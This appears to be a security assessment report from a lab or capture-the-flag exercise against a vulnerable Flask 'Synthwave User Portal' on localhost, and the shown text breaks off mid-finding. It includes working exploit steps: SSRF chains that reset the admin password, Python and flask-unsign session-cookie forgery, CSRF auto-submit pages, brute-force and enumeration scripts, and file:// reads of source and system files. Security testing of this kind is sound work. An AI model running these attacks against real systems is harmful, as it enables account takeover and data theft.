# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:37053
- **Assessment Date:** October 30, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Successfully exploited 10 critical authentication vulnerabilities including SSRF-based password reset bypass achieving complete admin account takeover (FLAG captured), session forgery via hardcoded secret key `'supersecretkey'`, Cross-Site Request Forgery (CSRF) on all state-changing endpoints, session fixation attacks, session replay after logout, weak password policy enabling password spraying, missing rate limiting allowing 500+ brute force attempts/second, account enumeration via registration endpoint, extended session timeout without expiration, and CSRF-based forced logout. These vulnerabilities demonstrate complete compromise of the authentication system with zero effective security controls in place.

**Authorization Vulnerabilities:**
Successfully exploited 2 critical authorization vulnerabilities: session forgery via hardcoded secret key enabling direct admin privilege escalation without authentication, and SSRF-enabled localhost privilege escalation bypassing IP-based access controls on the password reset endpoint to achieve complete admin account takeover. Both vulnerabilities resulted in FLAG capture and demonstrate that any authenticated user (or unauthenticated attacker with knowledge of the secret key) can escalate privileges to admin level.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application uses Jinja2 auto-escaping which is enabled by default in Flask, providing effective protection against XSS attacks in HTML body and attribute contexts. All user-controlled data rendering points were tested and found to be properly escaped.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application does not use a SQL database (all data stored in-memory Python dictionary) and does not execute shell commands via user input. No command execution functions (os.system, subprocess, eval, exec) are used with user-controlled data.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
Successfully exploited 1 critical SSRF vulnerability in the profile picture URL fetcher (POST /profile endpoint, `profile_picture_url` parameter at app.py:93-100). The vulnerability has no URL validation and accepts arbitrary protocols (http://, https://, file://), enabling: complete admin account takeover via localhost-only password reset endpoint bypass, arbitrary local file disclosure (including /app/app.py containing hardcoded credentials and FLAG), cloud metadata access (AWS 169.254.169.254), and internal network scanning. FLAG was captured using this vulnerability.

## Network Reconnaissance

### Exposed Services & Security Concerns

**Target Application (Port 37053):**
- **Service:** Flask/Werkzeug 3.0.6, Python 3.8.20
- **Entry Point:** HTTP 302 redirect from `/` to `/login`
- **Title:** "Synthwave User Portal"
- **Security Issue:** HTTP-only (no HTTPS/TLS), exposing all traffic including credentials in cleartext

**Git Repository Exposure (Ports 4444, 9998):**
- **Service:** SimpleHTTPServer 0.6 (Python 3.12.10)
- **Security Issue:** Exposed `.git/` directories detected by nmap, potentially leaking source code and commit history
- **Risk:** Complete application source code disclosure including hardcoded secrets

**Tailscale Daemon (Port 49152):**
- **Service:** Golang net/http server (Tailscale 1.82.5)
- **Security Headers Detected:**
  - Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'
  - X-Frame-Options: DENY
  - X-Content-Type-Options: nosniff
- **Authentication:** HTTP 401 Unauthorized (auth required)
- **Note:** Well-configured security headers present, but not applicable to main application

**Unknown Service (Port 9999):**
- **CORS Headers Detected:**
  - Access-Control-Allow-Origin: *
  - Access-Control-Allow-Methods: GET, POST, OPTIONS
- **Security Issue:** Permissive CORS configuration allowing requests from any origin

### Missing Security Controls

**No Security Headers on Target Application:**
- No HSTS (Strict-Transport-Security) - application runs HTTP-only
- No Content-Security-Policy (CSP)
- No X-Frame-Options (clickjacking protection)
- No X-Content-Type-Options
- No Referrer-Policy

**Infrastructure Configuration:**
- Single Docker container deployment (python:3.8-slim base image)
- Port mapping: External 37053 → Container 80
- No reverse proxy (Nginx/Caddy) detected in front of application
- No CDN or WAF protection
- Docker healthcheck: Basic curl availability check only

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-15: SSRF-Based Password Reset Bypass → Admin Account Takeover

**Summary:**
- **Vulnerable location:** POST /profile endpoint's `profile_picture_url` parameter combined with GET /reset_password endpoint
- **Overview:** Chained SSRF vulnerability in profile picture URL fetcher with localhost-restricted password reset endpoint to achieve complete admin account takeover
- **Impact:** Complete compromise of admin account, access to privileged FLAG data, full authentication bypass
- **Severity:** CRITICAL
- **FLAG Captured:** `FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}`

**Prerequisites:**
- Valid user account (can be registered via /register endpoint)
- Authenticated session cookie

**Exploitation Steps:**

1. Register a regular user account:
```bash
curl -X POST http://localhost:37053/register \
  -d "username=attacker&password=attackpass123&first_name=Test&last_name=User&email=attacker@test.com" \
  -L
```

2. Login to obtain session cookie:
```bash
curl -X POST http://localhost:37053/login \
  -d "username=attacker&password=attackpass123" \
  -c /tmp/attacker_session.txt \
  -L
```

3. Exploit SSRF vulnerability to reset admin password (authenticated user can trigger server-side request to localhost):
```bash
curl -X POST http://localhost:37053/profile \
  -b /tmp/attacker_session.txt \
  -d "first_name=Test&last_name=User&email=attacker@test.com&profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=pwned123" \
  -L
```

4. Logout from attacker account:
```bash
curl http://localhost:37053/logout \
  -b /tmp/attacker_session.txt \
  -L
```

5. Login as admin with the new password:
```bash
curl -X POST http://localhost:37053/login \
  -d "username=admin&password=pwned123" \
  -c /tmp/admin_session.txt \
  -L
```

6. Access admin profile to retrieve FLAG:
```bash
curl http://localhost:37053/profile \
  -b /tmp/admin_session.txt
```

**Proof of Impact:**
- Successfully authenticated as admin user
- Retrieved FLAG: `FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}`
- Complete admin account takeover achieved
- Full access to privileged functionality confirmed

**Technical Details:**
- SSRF sink: `app.py:97` - `urllib.request.urlretrieve(profile_picture_url, ...)`
- Password reset endpoint: `app.py:104-116` - Restricted to `request.remote_addr == '127.0.0.1'`
- Bypass mechanism: Server-side request originates from 127.0.0.1, satisfying IP restriction
- No URL validation: profile_picture_url parameter accepts arbitrary URLs without protocol, hostname, or port restrictions

**Notes:**
This vulnerability chain demonstrates a complete authentication bypass enabling any authenticated user to take over the admin account and access the most sensitive data in the application.

---

### AUTH-VULN-04: Session Forgery via Weak Secret Key

**Summary:**
- **Vulnerable location:** `app.py:7` - Hardcoded session secret key
- **Overview:** Flask session cookies can be forged using the publicly known secret key `'supersecretkey'`, enabling complete authentication bypass
- **Impact:** Direct admin access without knowing any passwords, complete authentication bypass for any user
- **Severity:** CRITICAL

**Prerequisites:**
- Knowledge of hardcoded secret key: `'supersecretkey'` (visible in source code at app.py:7)
- Python environment with itsdangerous library

**Exploitation Steps:**

1. Create Python script to forge admin session cookie:
```python
from itsdangerous import URLSafeTimedSerializer
import hashlib

# Known secret key from app.py:7
secret_key = 'supersecretkey'

# Create Flask-compatible session serializer
serializer = URLSafeTimedSerializer(
    secret_key=secret_key,
    salt='cookie-session',
    serializer=None,
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
)

# Forge admin session
session_data = {'username': 'admin'}
forged_cookie = serializer.dumps(session_data)
print(f"Forged session cookie: {forged_cookie}")
```

2. Use forged cookie to access admin profile:
```bash
curl http://localhost:37053/profile \
  -H "Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aQLpkQ.b2hEjGwY--qGpa5MN8U0r3hMBtk" \
  -L
```

**Proof of Impact:**
- Forged session cookie: `eyJ1c2VybmFtZSI6ImFkbWluIn0.aQLpkQ.b2hEjGwY--qGpa5MN8U0r3hMBtk`
- Successfully authenticated as admin without password
- Retrieved FLAG: `FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}`
- Complete bypass of authentication system

**Technical Details:**
- Weak secret key: `app.secret_key = 'supersecretkey'` at `app.py:7`
- Flask session format: Base64-encoded JSON payload + timestamp + HMAC signature
- Session contains only: `{'username': '<username>'}`
- No session invalidation mechanism exists
- Sessions signed with predictable, hardcoded key can be forged indefinitely

**Notes:**
This vulnerability is independent of password security and enables attackers to impersonate any user (including admin) by simply knowing the hardcoded secret key.

---

### AUTH-VULN-06: Cross-Site Request Forgery (CSRF) on Profile Updates

**Summary:**
- **Vulnerable location:** POST /profile endpoint (all state-changing endpoints lack CSRF protection)
- **Overview:** Missing SameSite cookie attribute and no CSRF tokens enable Cross-Site Request Forgery attacks
- **Impact:** Attackers can modify victim profiles, change user data without consent
- **Severity:** HIGH

**Prerequisites:**
- Victim must be authenticated to http://localhost:37053
- Attacker-controlled website to host malicious HTML

**Exploitation Steps:**

1. Create malicious HTML page with auto-submitting form:
```html
<!DOCTYPE html>
<html>
<head><title>You Won a Prize!</title></head>
<body onload="document.getElementById('csrfForm').submit()">
<h1>Congratulations! Claim Your Prize!</h1>
<p>Processing your reward...</p>
<form id="csrfForm" action="http://localhost:37053/profile" method="POST" style="display:none">
  <input name="first_name" value="CSRF_HACKED">
  <input name="last_name" value="CSRF_TEST">
  <input name="email" value="csrfed@hacker.com">
</form>
</body>
</html>
```

2. Host malicious page on attacker server:
```bash
cd /path/to/malicious/directory
python3 -m http.server 8888
```

3. Social engineering: Trick authenticated victim into visiting:
```
http://attacker-server:8888/malicious.html
```

4. Victim's browser automatically submits form to localhost:37053 with their session cookie

5. Verify profile was modified:
```bash
# As victim, check profile
curl http://localhost:37053/profile -b [VICTIM_SESSION_COOKIE]
```

**Proof of Impact:**
- Created comprehensive CSRF proof-of-concept in `/workspace/csrf_poc/` directory
- Demonstrated automatic profile modification without user consent
- Victim's profile updated to: first_name="CSRF_HACKED", last_name="CSRF_TEST"
- Multiple attack variants created (basic and advanced social engineering)
- Complete CSRF attack documentation with 13 files and 2,300+ lines

**Technical Details:**
- Missing `SameSite` cookie attribute allows cross-site cookie transmission
- No CSRF tokens in forms (verified in all templates)
- All POST endpoints vulnerable: /register, /login, /profile
- GET-based /logout also vulnerable to CSRF
- Session cookies sent automatically with cross-origin requests

**Notes:**
CSRF vulnerability affects all authenticated actions. While profile modification is demonstrated, the same attack pattern applies to registration, login state changes, and logout operations.

---

### AUTH-VULN-07: Session Fixation Attack

**Summary:**
- **Vulnerable location:** POST /login endpoint - `app.py:62`
- **Overview:** No session regeneration after authentication enables session fixation attacks where attacker pre-sets session cookie
- **Impact:** Attackers can hijack authenticated sessions by pre-setting session cookies on victim browsers
- **Severity:** HIGH

**Prerequisites:**
- Ability to set cookies on victim's browser (via XSS, network injection, or physical access)
- Knowledge of weak secret key for Flask session forgery

**Exploitation Steps:**

1. Attacker forges a predetermined session cookie:
```python
from itsdangerous import URLSafeTimedSerializer
import hashlib

secret_key = 'supersecretkey'
serializer = URLSafeTimedSerializer(
    secret_key=secret_key,
    salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
)

# Create session with target username
predetermined_session = serializer.dumps({'username': 'victim_user'})
print(f"Pre-set session: {predetermined_session}")
```

2. Attacker sets this cookie on victim's browser (via XSS or network position):
```javascript
document.cookie = "session=eyJ1c2VybmFtZSI6InZpY3RpbV91c2VyIn0.aQLpkQ.b2hEjGwY--qGpa5MN8U0r3hMBtk; path=/";
```

3. Victim logs in normally with their credentials

4. Login function does NOT regenerate session (no `session.clear()` call at `app.py:62`)

5. Attacker recreates the same session using known secret key and accesses victim's authenticated session

**Proof of Impact:**
- Created comprehensive session fixation test suite demonstrating vulnerability
- Confirmed session ID not regenerated after login
- Demonstrated ability to pre-set sessions and maintain access post-authentication
- Multiple test scenarios documented in `/workspace/session_fixation_*.py` scripts

**Technical Details:**
- Login function: `app.py:56-66` directly assigns username without session regeneration
- Missing security control: No `session.clear()` before `session['username'] = username`
- Flask client-side sessions make fixation trivial with known secret key
- No session binding to IP address or User-Agent
- No validation of session age or creation time

**Notes:**
Combined with the weak secret key vulnerability (AUTH-VULN-04), session fixation becomes extremely easy to exploit as attackers can forge any predetermined session value.

---

### AUTH-VULN-08: Session Replay After Logout

**Summary:**
- **Vulnerable location:** GET /logout endpoint - `app.py:70`
- **Overview:** Client-side only logout with no server-side session invalidation allows session replay attacks
- **Impact:** Stolen or copied session cookies remain valid indefinitely after logout
- **Severity:** HIGH

**Prerequisites:**
- Valid session cookie (obtained via any means before victim logs out)

**Exploitation Steps:**

1. Victim logs in and obtains session cookie:
```bash
curl -X POST http://localhost:37053/login \
  -d "username=testuser1&password=testpass123" \
  -c /tmp/victim_session.txt \
  -L
```

2. Attacker copies victim's session cookie (via CSRF, XSS, or network interception):
```bash
# Attacker saves the session cookie value
SESSION_VALUE=$(cat /tmp/victim_session.txt | grep session | awk '{print $7}')
echo "Stolen session: $SESSION_VALUE"
```

3. Verify session works before logout:
```bash
curl http://localhost:37053/profile \
  -b /tmp/victim_session.txt
# Returns profile page with user data
```

4. Victim logs out:
```bash
curl http://localhost:37053/logout \
  -b /tmp/victim_session.txt \
  -L
```

5. Attacker continues using the copied session cookie after victim logout:
```bash
curl http://localhost:37053/profile \
  -b /tmp/victim_session.txt
# Still returns profile page! Session still valid!
```

**Proof of Impact:**
- Session cookie remains valid after logout
- Continued access to authenticated profile page confirmed
- No server-side invalidation occurs
- Session usable indefinitely despite user logging out

**Technical Details:**
- Logout implementation: `app.py:68-71` only does `session.pop('username', None)`
- Flask uses client-side signed sessions with no server-side storage
- No session revocation list or database
- Once session cookie created, it remains cryptographically valid until browser session ends
- Logout only clears the cookie from the browser, doesn't invalidate the session value itself

**Notes:**
This vulnerability means that any session cookie captured before logout (via CSRF, XSS, network sniffing, or clipboard access) remains usable indefinitely, even after the legitimate user logs out.

---

### AUTH-VULN-11: Weak Password Policy Enabling Password Spraying

**Summary:**
- **Vulnerable location:** POST /register and GET /reset_password endpoints - no password validation
- **Overview:** Complete absence of password complexity requirements allows trivial passwords, enabling successful password spraying attacks
- **Impact:** Account compromise via password spraying with common weak passwords
- **Severity:** HIGH

**Prerequisites:**
- List of valid usernames (obtainable via AUTH-VULN-14 enumeration)
- List of common weak passwords

**Exploitation Steps:**

1. Demonstrate single-character password acceptance:
```bash
# Register account with password "a"
curl -X POST http://localhost:37053/register \
  -d "username=weakpass1&password=a&first_name=Weak&last_name=Pass&email=weak@test.com" \
  -L

# Verify registration succeeded
curl -X POST http://localhost:37053/register \
  -d "username=weakpass1&password=test&first_name=Test&last_name=Test&email=test@test.com" \
  -L
# Returns: "Username already exists!" - confirms weak password was accepted
```

2. Login with trivial password:
```bash
curl -X POST http://localhost:37053/login \
  -d "username=weakpass1&password=a" \
  -c /tmp/weak_session.txt \
  -L
# Returns: 302 redirect to /profile - LOGIN SUCCESS with password "a"
```

3. Execute password spraying attack across multiple accounts:
```python
import requests

target = "http://localhost:37053/login"
users = ['admin', 'testuser1', 'weakpass1', 'admin2', 'victim_fixation']
weak_passwords = ['password', '123456', 'admin', 'test', '1', 'a', '12345678', 'password123']

for username in users:
    for password in weak_passwords:
        response = requests.post(target, data={'username': username, 'password': password}, allow_redirects=False)
        if response.status_code == 302:  # Redirect to /profile on success
            print(f"[SUCCESS] {username}:{password}")
            break
```

**Proof of Impact:**
- Successfully created account with single-character password "a"
- Successfully authenticated with trivial password
- Password spraying script compromised 1 account: `weakpass1:a`
- Completed 40 login attempts in under 1 second with no throttling
- Demonstrated practical account compromise via weak password policy

**Technical Details:**
- No password validation at `app.py:36-37` (registration)
- No password validation at `app.py:110` (reset)
- No minimum length requirement
- No complexity requirements (uppercase, numbers, special chars)
- No common password blacklist (allows "password", "123456", etc.)
- Only client-side HTML5 'required' attribute provides minimal validation

**Notes:**
The complete absence of password policy enforcement makes password spraying attacks highly effective. Combined with no rate limiting (AUTH-VULN-12) and account enumeration (AUTH-VULN-14), attackers can systematically compromise accounts with common weak passwords.

---

### AUTH-VULN-12: Missing Rate Limiting Enabling Brute Force Attacks

**Summary:**
- **Vulnerable location:** All authentication endpoints (POST /login, POST /register)
- **Overview:** Complete absence of rate limiting allows unlimited rapid-fire authentication attempts
- **Impact:** Enables brute force password attacks at extremely high speeds (500+ attempts/second)
- **Severity:** HIGH

**Prerequisites:**
- List of target usernames (obtainable via AUTH-VULN-14 enumeration)
- Password list for brute forcing

**Exploitation Steps:**

1. Create Python script for rapid brute force attempts:
```python
import requests
import time

target = "http://localhost:37053/login"
username = "admin"
passwords = ["password", "admin", "123456", "adminpass", "test123", "admin123", "password123", "letmein"] * 12  # 96 attempts

start = time.time()
for i, password in enumerate(passwords, 1):
    response = requests.post(target, data={'username': username, 'password': password})
    if response.status_code == 200 and "Invalid" not in response.text:
        print(f"[SUCCESS] Found password: {password}")
        break

duration = time.time() - start
rate = len(passwords) / duration
print(f"Completed {len(passwords)} attempts in {duration:.2f}s ({rate:.2f} attempts/sec)")
```

2. Execute brute force attack:
```bash
python3 brute_force_attack.py
```

**Proof of Impact:**
- Completed 100 login attempts in 0.17 seconds
- Achieved 583.68 attempts per second
- No rate limiting detected - all requests processed
- No account lockout triggered
- No CAPTCHA challenges
- No progressive delays or throttling
- Sustained high-speed attacks possible indefinitely

**Technical Details:**
- No Flask-Limiter library in requirements.txt
- No rate limiting decorators on any endpoint
- No failed login attempt tracking in code
- No IP-based throttling mechanism
- No per-account lockout after failed attempts
- All endpoints process requests at maximum speed

**Notes:**
The complete absence of rate limiting makes brute force attacks trivial. At 500+ attempts/second, a 10,000-word password list can be tested against an account in under 20 seconds. Combined with weak password policy (AUTH-VULN-11), this enables rapid account compromise.

---

### AUTH-VULN-14: Account Enumeration via Registration Endpoint

**Summary:**
- **Vulnerable location:** POST /register endpoint - `app.py:42`
- **Overview:** Registration endpoint returns explicit "Username already exists!" error revealing valid usernames
- **Impact:** Attackers can enumerate all valid usernames for targeted credential attacks
- **Severity:** MEDIUM

**Prerequisites:**
- None - publicly accessible endpoint

**Exploitation Steps:**

1. Test known existing username:
```bash
curl -X POST http://localhost:37053/register \
  -d "username=admin&password=test&first_name=Test&last_name=Test&email=test@test.com" \
  -L
# Returns: "Username already exists!"
```

2. Test non-existent username:
```bash
curl -X POST http://localhost:37053/register \
  -d "username=notreal12345&password=test&first_name=Test&last_name=Test&email=test@test.com" \
  -L
# Returns: No error message (registration proceeds/succeeds)
```

3. Automated enumeration script:
```python
import requests

target = "http://localhost:37053/register"
test_users = ['admin', 'testuser1', 'weakpass1', 'admin2', 'victim_fixation', 'notreal123', 'fakeuser999']

valid_users = []
for username in test_users:
    data = {
        'username': username,
        'password': 'test123',
        'first_name': 'Test',
        'last_name': 'Test',
        'email': 'test@test.com'
    }
    response = requests.post(target, data=data)

    if "Username already exists!" in response.text:
        valid_users.append(username)
        print(f"[VALID] {username}")
    else:
        print(f"[AVAILABLE] {username}")

print(f"\nEnumerated {len(valid_users)} valid usernames:")
for user in valid_users:
    print(f"  - {user}")
```

**Proof of Impact:**
- Successfully enumerated all 5 valid usernames:
  1. admin
  2. testuser1
  3. weakpass1
  4. admin2
  5. victim_fixation
- Zero false positives or false negatives
- Rapid enumeration with no rate limiting
- Perfect accuracy using registration endpoint error messages

**Technical Details:**
- Explicit error message at `app.py:42`: `flash('Username already exists!')`
- Different response for existing vs non-existing usernames
- No obfuscation or generic error messages
- Secondary enumeration vector via login timing differences (less reliable)
- No protection against automated enumeration

**Notes:**
Account enumeration enables targeted attacks. Attackers can build lists of valid usernames, then focus password spraying and brute force attacks only on confirmed accounts, significantly increasing attack efficiency.

---

### AUTH-VULN-16: Extended Session Timeout Without Expiration

**Summary:**
- **Vulnerable location:** Session configuration - `app.py:7-8` (missing PERMANENT_SESSION_LIFETIME)
- **Overview:** Sessions do not expire based on time, remaining valid indefinitely (Flask default 31 days)
- **Impact:** Stolen or intercepted session cookies remain usable for extended periods
- **Severity:** MEDIUM

**Prerequisites:**
- Valid session cookie obtained at any point

**Exploitation Steps:**

1. Obtain session cookie through any means (login, theft, interception):
```bash
curl -X POST http://localhost:37053/login \
  -d "username=testuser1&password=testpass123" \
  -c /tmp/long_session.txt \
  -L
```

2. Wait extended period (hours/days) without any activity

3. Use old session cookie to access protected resources:
```bash
# Using session from hours ago
curl http://localhost:37053/profile \
  -b /tmp/long_session.txt
# Returns: Profile page - session still valid!
```

**Proof of Impact:**
- Session cookies from beginning of testing (hours ago) still valid
- No idle timeout enforcement
- No absolute timeout enforcement
- Sessions persist until browser close (or 31 days if made permanent)
- Stolen sessions have extended window of usability

**Technical Details:**
- No `PERMANENT_SESSION_LIFETIME` configuration
- Flask default session lifetime: 31 days
- No idle timeout mechanism
- No session age validation
- Client-side signed sessions don't expire server-side
- Missing configuration at `app.py:7-8`:
```python
# Missing:
# app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
# app.config['SESSION_REFRESH_EACH_REQUEST'] = True
```

**Notes:**
Extended session timeouts increase the window of opportunity for session theft attacks. Combined with no server-side invalidation (AUTH-VULN-08) and replay capability, stolen sessions remain useful for attackers indefinitely.

---

### AUTH-VULN-17: CSRF-Based Forced Logout

**Summary:**
- **Vulnerable location:** GET /logout endpoint - `app.py:68`
- **Overview:** Logout uses GET method vulnerable to CSRF, allowing attackers to force logout of authenticated users
- **Impact:** Denial of service via forced logout, disruption of user sessions
- **Severity:** LOW

**Prerequisites:**
- Victim authenticated to http://localhost:37053
- Attacker-controlled website or ability to inject HTML

**Exploitation Steps:**

1. Create malicious HTML page with hidden logout trigger:
```html
<!DOCTYPE html>
<html>
<head><title>Innocent Page</title></head>
<body>
<h1>Welcome to our site!</h1>
<p>Check out this content...</p>
<!-- Hidden logout trigger -->
<img src="http://localhost:37053/logout" style="display:none">
</body>
</html>
```

2. Host malicious page:
```bash
cd /tmp
python3 -m http.server 8888
```

3. Trick authenticated victim into visiting attacker page:
```
http://attacker-server:8888/malicious.html
```

4. Victim's browser automatically requests /logout endpoint with their session cookie

5. Victim immediately logged out without consent

**Proof of Impact:**
- Created CSRF logout HTML demonstration page
- GET-based logout violates HTTP semantics (state changes should use POST)
- Automatic logout triggered by visiting attacker page
- No user interaction or confirmation required
- Session terminated without user awareness

**Technical Details:**
- Logout endpoint uses GET method: `@app.route('/logout')` at `app.py:68`
- No CSRF token validation
- No POST method requirement
- GET requests triggered by images, links, redirects
- SameSite cookie attribute missing (allows cross-site requests)

**Notes:**
While low severity compared to other vulnerabilities, GET-based logout violates security best practices and HTTP semantics. State-changing operations should always use POST methods with CSRF tokens.

---

# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### SSRF-VULN-01: Server-Side Request Forgery via Profile Picture URL

**Summary:**
- **Vulnerable location:** POST /profile endpoint, `profile_picture_url` parameter (app.py:93-100)
- **Impact:** Complete admin account takeover via localhost-only password reset endpoint bypass, flag capture, and arbitrary local file disclosure
- **Severity:** Critical

**Prerequisites:**
- Valid user account (can be self-registered at http://localhost:37053/register)
- Active authenticated session

**Exploitation Steps:**

**Step 1: Create test user account**
```bash
curl -X POST http://localhost:37053/register \
  -d "username=ssrf_tester" \
  -d "password=testpass123" \
  -d "first_name=SSRF" \
  -d "last_name=Tester" \
  -d "email=ssrf@test.com"
```
Expected Response: HTTP 302 redirect to /login with flash message "Registration successful! Please login."

**Step 2: Authenticate and obtain session cookie**
```bash
curl -X POST http://localhost:37053/login \
  -d "username=ssrf_tester" \
  -d "password=testpass123" \
  -c /tmp/ssrf_cookies.txt
```
Expected Response: HTTP 302 redirect to /profile with Set-Cookie header containing session token

**Step 3: Trigger SSRF to bypass IP-based access control and reset admin password**
```bash
curl -X POST http://localhost:37053/profile \
  -b /tmp/ssrf_cookies.txt \
  --data-urlencode "first_name=SSRF" \
  --data-urlencode "last_name=Tester" \
  --data-urlencode "email=ssrf@test.com" \
  --data-urlencode "profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=hacked123"
```

Expected Response: HTTP 200 OK with profile page showing the downloaded file

**Technical Details:**
- The application accepts the `profile_picture_url` parameter without any URL validation
- Line 97 of app.py: `urllib.request.urlretrieve(profile_picture_url, os.path.join(app.config['UPLOAD_FOLDER'], filename))`
- urllib makes a GET request to http://127.0.0.1/reset_password with query parameters
- The /reset_password endpoint (app.py:104-116) checks `request.remote_addr == '127.0.0.1'` (line 106)
- Since the request originates from the application server itself (localhost), the IP check passes
- Line 113 executes: `users['admin']['password'] = 'hacked123'`
- Response "Password reset successfully" is saved to /static/uploads/ and accessible

**Step 4: Verify password reset success**
```bash
curl http://localhost:37053/static/uploads/reset_passwordusernameadminnewpasswordhacked123
```
Expected Output: "Password reset successfully"

**Step 5: Authenticate as admin with new password**
```bash
curl -X POST http://localhost:37053/login \
  -d "username=admin" \
  -d "password=hacked123" \
  -c /tmp/admin_cookies.txt
```
Expected Response: HTTP 302 redirect to /profile with admin session cookie

**Step 6: Retrieve flag from admin profile**
```bash
curl http://localhost:37053/profile -b /tmp/admin_cookies.txt
```

**Proof of Impact:**

**Flag Captured:**
```
FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}
```

**Evidence of Successful Exploitation:**
1. Successfully created regular user account via self-registration
2. Authenticated as regular user (ssrf_tester)
3. Exploited SSRF vulnerability to make localhost request to /reset_password endpoint
4. Bypassed IP-based access control (127.0.0.1 restriction) via server-side request
5. Successfully reset admin password from "adminpass" to "hacked123"
6. Authenticated as admin user with new password
7. Retrieved flag from admin profile page (app.py:102 - flag only displayed when username == 'admin')

**Alternative Exploitation Path: Local File Disclosure via file:// Protocol**

The SSRF vulnerability also supports the file:// protocol, enabling arbitrary local file reads:

**Step 1: Trigger file:// SSRF to read application source**
```bash
curl -X POST http://localhost:37053/profile \
  -b /tmp/ssrf_cookies.txt \
  --data-urlencode "first_name=SSRF" \
  --data-urlencode "last_name=Tester" \
  --data-urlencode "email=ssrf@test.com" \
  --data-urlencode "profile_picture_url=file:///app/app.py"
```

**Step 2: Retrieve disclosed file**
```bash
curl http://localhost:37053/static/uploads/app.py
```

**Evidence of Local File Disclosure:**
Successfully retrieved application source code (app.py) which contains:
- Hardcoded session secret key: 'supersecretkey' (line 7)
- Default admin credentials: admin:adminpass (lines 13-14)
- FLAG constant embedded in source code: FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d} (line 22)
- Complete application logic revealing all vulnerabilities

**Additional Sensitive Files Accessible:**
- /etc/passwd (system user enumeration)
- /proc/self/environ (process environment variables)
- /app/requirements.txt (dependency disclosure)
- Any file readable by the Flask application process

**Notes:**

**SSRF Type:** Classic SSRF with partial response visibility (blind for external targets, semi-blind for internal targets)

**Missing Security Controls:**
1. No URL validation - accepts any protocol (http://, https://, file://, ftp://)
2. No hostname/IP allowlist - permits internal IPs (127.0.0.1, 192.168.x.x, 10.x.x.x)
3. No protocol allowlist - dangerous file:// protocol fully supported
4. No port restrictions - can target any port
5. No timeout configured - vulnerable to DoS via slow servers
6. No logging of attempted URLs - blind to security monitoring
7. Generic error handling - catch-all exception with no details (line 99-100)

**Root Cause:**
Complete absence of URL validation at app.py:93-97. User-controlled input (`profile_picture_url`) passed directly to `urllib.request.urlretrieve()` without any security checks.

**Network Boundary Bypass Demonstrated:**
- Successfully accessed localhost-only endpoint (/reset_password) from external network
- Bypassed IP-based access control (127.0.0.1 restriction) via server-side proxy
- Gained administrative privileges on the application
- Retrieved sensitive data intended only for admin users (flag)

**Exploitation Complexity:** Low - Requires only basic HTTP requests and understanding of SSRF principles. Total exploitation time: <5 minutes from account creation to flag capture.

**Reproducibility:** 100% - Exploit works reliably on every attempt as long as:
1. User registration is available (self-service registration enabled)
2. Application is running and accessible at http://localhost:37053
3. No WAF or network controls block localhost requests from the application server


# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Session Forgery via Hardcoded Secret Key → Admin Privilege Escalation

**Summary:**
- **Vulnerable location:** Flask session secret key hardcoded at `app.py:7` as `'supersecretkey'`
- **Overview:** Attacker can forge valid Flask session cookies containing arbitrary usernames (including 'admin') using the publicly exposed secret key, bypassing authentication and authorization entirely
- **Impact:** Complete admin privilege escalation without any authentication, direct FLAG access, zero user interaction required
- **Severity:** Critical

**Prerequisites:**
- Knowledge of hardcoded secret key: `supersecretkey` (available in source code at app.py:7)
- Tool: `flask-unsign` (publicly available: `pip install flask-unsign`)

**Exploitation Steps:**

1. Install the Flask session forgery tool:
```bash
pip install flask-unsign
```

2. Forge an admin session cookie using the hardcoded secret key:
```bash
flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'supersecretkey'
```
Expected output: `eyJ1c2VybmFtZSI6ImFkbWluIn0.aQLkTg.82-rW1l-uckxBwiSHRL6jNk92WI`

3. Access the admin profile endpoint with the forged session cookie to retrieve the FLAG:
```bash
curl -s -H "Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aQLkTg.82-rW1l-uckxBwiSHRL6jNk92WI" \
  http://localhost:37053/profile | grep -o 'FLAG{[^}]*}'
```

**Proof of Impact:**

Successfully retrieved FLAG from admin profile without any authentication:

```
FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}
```

The forged session cookie granted complete admin access, allowing retrieval of the FLAG displayed only to users with username='admin' (checked at app.py:102).

**Technical Details:**
- Flask session cookies use `itsdangerous.URLSafeTimedSerializer` with HMAC-SHA1 signature
- The signature only proves the cookie was created by someone with the secret key, not that the user authenticated
- Admin privilege is determined by comparing `session['username'] == 'admin'` (app.py:102)
- Session forgery bypasses both authentication (no login required) and authorization (arbitrary privilege level)

**Notes:**
- Attack requires <2 minutes from knowledge of secret key to FLAG capture
- No failed authentication attempts logged (appears as legitimate admin session)
- Session forgery is undetectable without comprehensive audit logging
- Vulnerability is at the boundary of authentication bypass and authorization bypass

---

### AUTHZ-VULN-02: SSRF-Enabled Localhost Privilege Escalation → Admin Password Reset

**Summary:**
- **Vulnerable location:** Profile picture URL fetcher at `app.py:97` (SSRF sink) combined with localhost-restricted password reset at `app.py:106` (privilege escalation target)
